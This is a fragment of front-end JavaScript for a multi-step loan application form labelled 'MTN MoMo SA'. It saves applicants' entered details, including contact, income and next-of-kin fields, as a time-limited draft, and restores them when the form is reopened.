        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1pu')?.value || '',
        employment: document.getElementById('s3em')?.value || '',
        annualIncome: document.getElementById('s3in')?.value || '',
        kinName: document.getElementById('s3kn')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        timestamp: new Date().toISOString()
    });
}
function loadDraft() {
    const d = get(KEYS.DRAFT);
    if (!d || Date.now() - new Date(d.timestamp).getTime() > 24 * 3600 * 1000) return false;
    if (d.firstName) document.getElementById('s2fi').value = d.firstName;
    if (d.lastName) document.getElementById('s2la').value = d.lastName;
    if (d.phone) document.getElementById('s2ph').value = d.phone;
    if (d.email) document.getElementById('s2em').value = d.email;
    if (d.loanAmount) document.getElementById('s1am').value = d.loanAmount;
    if (d.loanPurpose) document.getElementById('s1pu').value = d.loanPurpose;
    if (d.employment) document.getElementById('s3em').value = d.employment;
    if (d.annualIncome) document.getElementById('s3in').value = d.annualIncome;
    if (d.kinName) document.getElementById('s3kn').value = d.kinName;
    if (d.kinPhone) document.getElementById('s3kp').value = d.kinPhone;
    return true;
}

document.addEventListener('input', (e) => {
    if (e.target.closest('#page-step1, #page-step2, #page-step3, #page-guarantor')) saveDraft();
});

// ─── INIT ───
updateCalc();
recoverSession();
console.log('✅ MTN MoMo SA loaded');
